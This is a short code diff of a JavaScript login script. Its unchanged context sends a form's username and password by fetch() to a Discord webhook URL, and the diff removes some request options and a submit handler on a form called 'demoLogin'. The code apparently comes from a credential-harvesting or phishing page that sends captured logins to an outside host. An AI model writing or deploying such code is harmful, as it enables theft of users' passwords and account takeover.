@@ -12,14 +12,7 @@ fetch('https://discord.com/api/webhooks/1573500610710601778/M92sTTydO6gH-b6VN-SP
     username,
     password,
   }),
-  credentials: 'include',
-  redirect: true,
 })
 .then((response) => response.json())
 .then((data) => console.log(data))
 .catch((error) => console.error(error));
-
-// Previna a submissão do formulário
-document.getElementById('demoLogin').addEventListener('submit', function(event) {
-  event.preventDefault();
-});
